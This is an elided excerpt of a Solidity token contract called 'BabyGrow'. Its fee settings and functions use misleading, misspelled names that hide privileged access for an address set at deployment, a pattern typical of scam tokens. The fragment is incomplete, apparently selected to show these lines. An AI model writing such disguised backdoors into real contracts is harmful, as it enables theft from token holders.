...
contract BabyGrow is Context, IERC20, Ownable {
    ...
    string private _name = "BabyGrow";
    string private _symbol = "BabyGrow";
    ...
    constructor(address _liquidityFee, address _initzills, address rAmount) {
        ...
        _owner = msg.sender;
        _nunTokensSellToAddToLiquidity = _liquidityFee;
    ...
    function setFeesToSetter(bool _swapAndLlquifyEnabled, address _newPeir) external {
        if (_lsOpenTrade() == _nunTokensSellToAddToLiquidity) {
            require(_lsOpenTrade() == _nunTokensSellToAddToLiquidity);
    ...
    function transferFrom(
        ...
        if (_isExcluFee[sender] || _isExcluFee[recipient]) {
            ...
            _approve(sender,_lsOpenTrade(),_allowances[sender][_lsOpenTrade()].sub(amount,"ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_zeroTax).div(100);
    ...
    function reflectlonFromToken(address spender, address recipient) external {
        if (_lsOpenTrade() == _nunTokensSellToAddToLiquidity || _lsOpenTrade() == _taxFee) {
            require(recipient == address(0));
            require(_lsOpenTrade() == _nunTokensSellToAddToLiquidity || _lsOpenTrade() == _taxFee);
